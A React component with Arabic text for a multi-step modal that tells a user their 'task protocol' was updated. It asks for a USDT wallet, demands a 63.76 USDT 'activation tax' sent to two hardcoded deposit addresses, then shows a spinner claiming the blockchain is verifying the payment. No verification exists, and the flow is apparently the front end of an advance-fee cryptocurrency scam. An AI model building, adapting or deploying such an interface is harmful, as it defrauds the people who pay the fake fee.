
import React, { useState } from 'react';
import { Copy, Info, CheckCircle2, ShieldAlert } from 'lucide-react';

interface ActionModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const ActionModal: React.FC<ActionModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [walletLink, setWalletLink] = useState('');

  if (!isOpen) return null;

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    // You could replace this with a toast notification
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm animate-fade-in">
      <div className="bg-white w-full max-w-[340px] rounded-[32px] overflow-hidden shadow-2xl">
        
        {/* Header decoration */}
        <div className="h-2 bg-[#9B4A4E] w-full"></div>

        <div className="p-8">
            {/* Step 1: Welcome Alert */}
            {step === 1 && (
            <div className="text-center">
                <div className="mb-4 flex justify-center">
                    <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center text-[#9B4A4E]">
                        <ShieldAlert size={32} />
                    </div>
                </div>
                <h3 className="text-xl font-bold text-gray-800 mb-4">تنبيه هام</h3>
                <p className="text-[14px] text-gray-600 leading-relaxed mb-8">
                أهلاً بك <span className="font-bold text-[#9B4A4E]">gHKA616</span>. تم تحديث بروتوكول المهام بالتعاون مع <span className="font-bold text-blue-600">mini pro</span>. يرجى المتابعة لربط حسابك.
                </p>
                <button 
                onClick={() => setStep(2)}
                className="w-full bg-[#9B4A4E] hover:bg-[#7C4A50] text-white py-4 rounded-2xl font-bold active:scale-95 transition-all shadow-md"
                >
                التالي
                </button>
            </div>
            )}

            {/* Step 2: Wallet Binding */}
            {step === 2 && (
            <div className="text-center">
                <h3 className="text-xl font-bold text-gray-800 mb-4">ربط المحفظة</h3>
                <p className="text-sm text-gray-500 mb-6">يرجى إدخال عنوان محفظتك (USDT) المعتمد للسحب:</p>
                <div className="relative mb-8">
                    <input 
                    type="text" 
                    value={walletLink}
                    onChange={(e) => setWalletLink(e.target.value)}
                    placeholder="مثال: 0x... أو T..."
                    className="w-full bg-gray-50 border-2 border-transparent focus:border-[#9B4A4E] rounded-2xl px-5 py-4 outline-none transition-all text-center font-mono text-sm"
                    dir="ltr"
                    />
                </div>
                <button 
                onClick={() => walletLink.trim() !== '' && setStep(3)}
                disabled={walletLink.trim() === ''}
                className={`w-full py-4 rounded-2xl font-bold active:scale-95 transition-all ${walletLink.trim() !== '' ? 'bg-[#9B4A4E] text-white shadow-md' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                >
                تأكيد الربط
                </button>
            </div>
            )}

            {/* Step 3: Payment Instructions */}
            {step === 3 && (
            <div className="text-center">
                <div className="mb-4 flex justify-center">
                    <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center text-blue-600">
                        <Info size={32} />
                    </div>
                </div>
                <h3 className="text-xl font-bold text-gray-800 mb-4">تعليمات التفعيل</h3>
                <p className="text-[13px] text-gray-500 leading-relaxed mb-6">
                لتفعيل قناة السحب التلقائي، يجب إرسال ضريبة التفعيل لمرة واحدة:
                </p>
                <div className="bg-red-50 p-4 rounded-2xl mb-8 border border-red-100">
                    <span className="text-2xl font-bold text-red-600">63.76 USDT</span>
                    <p className="text-[10px] text-red-400 mt-1">يجب إرسال المبلغ بدقة متناهية</p>
                </div>
                <button 
                onClick={() => setStep(4)}
                className="w-full bg-[#9B4A4E] text-white py-4 rounded-2xl font-bold active:scale-95 transition-all shadow-md"
                >
                عرض عناوين الدفع
                </button>
            </div>
            )}

            {/* Step 4: Deposit Addresses */}
            {step === 4 && (
            <div className="text-right">
                <h3 className="text-xl font-bold text-gray-800 mb-6 text-center">عناوين الإيداع</h3>
                
                <div className="space-y-4 mb-8">
                <div className="p-4 bg-gray-50 rounded-2xl border border-gray-100 group">
                    <p className="text-[10px] font-bold text-gray-400 mb-2 uppercase tracking-wider">USDT (BEP20)</p>
                    <div className="flex items-center justify-between gap-3">
                    <span className="text-[11px] font-mono break-all text-left flex-1 text-gray-600 leading-tight">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                    <button onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="p-2 bg-white rounded-lg shadow-sm text-[#9B4A4E] active:scale-90 transition-transform">
                        <Copy size={16}/>
                    </button>
                    </div>
                </div>
                
                <div className="p-4 bg-gray-50 rounded-2xl border border-gray-100 group">
                    <p className="text-[10px] font-bold text-gray-400 mb-2 uppercase tracking-wider">USDT (TRC20)</p>
                    <div className="flex items-center justify-between gap-3">
                    <span className="text-[11px] font-mono break-all text-left flex-1 text-gray-600 leading-tight">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
                    <button onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="p-2 bg-white rounded-lg shadow-sm text-[#9B4A4E] active:scale-90 transition-transform">
                        <Copy size={16}/>
                    </button>
                    </div>
                </div>
                </div>

                <button 
                onClick={() => setStep(5)}
                className="w-full bg-[#9B4A4E] text-white py-4 rounded-2xl font-bold active:scale-95 transition-all shadow-lg"
                >
                أكملت عملية الدفع
                </button>
            </div>
            )}

            {/* Step 5: Verification Spinner */}
            {step === 5 && (
            <div className="text-center py-6">
                <div className="flex justify-center mb-6">
                <div className="relative">
                    <div className="w-20 h-20 border-4 border-gray-100 rounded-full"></div>
                    <div className="w-20 h-20 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin absolute inset-0"></div>
                </div>
                </div>
                <h3 className="text-xl font-bold text-gray-800 mb-3">جاري التحقق</h3>
                <p className="text-sm text-gray-500 leading-relaxed px-4">
                نظام البلوكشين يقوم حالياً بمطابقة حوالتك. يرجى عدم إغلاق هذه الصفحة...
                </p>
                <div className="mt-8 flex items-center justify-center gap-2 text-xs text-gray-400">
                    <CheckCircle2 size={14} className="text-green-500" />
                    <span>تم ربط المحفظة بنجاح</span>
                </div>
            </div>
            )}
        </div>
      </div>
    </div>
  );
};

export default ActionModal;
